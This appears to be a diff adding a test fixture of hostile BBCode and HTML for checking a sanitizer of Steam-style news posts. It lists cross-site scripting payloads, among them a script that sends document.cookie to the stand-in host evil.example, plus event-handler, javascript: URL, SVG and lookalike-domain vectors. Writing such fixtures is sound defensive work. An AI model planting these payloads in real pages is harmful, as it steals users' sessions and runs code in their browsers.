@@ -1,0 +1,28 @@
+[h1]Update[/h1]
+<script>document.location='https://evil.example/?c='+document.cookie</script>
+<SCRIPT type="text/javascript">alert("upper")</SCRIPT>
+<style>body{display:none}</style>
+<iframe src="https://evil.example/frame"></iframe>
+<img src="javascript:alert(1)" onerror="alert(2)">
+<img src="https://evil.example/tracker.png">
+<img src="http://clan.akamai.steamstatic.com/images/1/plain-http.png">
+<img src='https://clan.akamai.steamstatic.com/images/1/ok.png' onerror=alert(3)>
+<img src="https://clan.akamai.steamstatic.com.evil.example/images/x.png">
+<img src="https://user:pw@clan.akamai.steamstatic.com/images/x.png">
+<img src="https://clan.akamai.steamstatic.com:8443/images/x.png">
+<img src="https://clan.akamai.steamstatic.com/images/x.svg">
+[img]https://cdn.akamai.steamstatic.com/steam/apps/620/ss_1.jpg[/img]
+[img]javascript:alert(4)[/img]
+<a href="javascript:alert(5)" onclick="alert(6)">Click me</a>
+[url=javascript:alert(7)]Also a link[/url]
+<p onmouseover="alert(8)">Hover text</p>
+&amp;lt;b&amp;gt;double-encoded&amp;lt;/b&amp;gt;
+<!-- <script>alert(10)</script> -->
+<svg><script>alert(11)</script><text>svg text</text></svg>
+<object data="evil.swf"><embed src="evil.swf">fallback</object>
+[previewyoutube=dQw4w9WgXcQ;full][/previewyoutube]
+Right‮to‬left override and a bell
+[code]<script>alert(12)</script>[/code]
+<div style="background:url(javascript:alert(13))">styled</div>
+<noscript><img src="https://clan.akamai.steamstatic.com/images/1/hidden.png"></noscript>
+Unclosed <b>bold
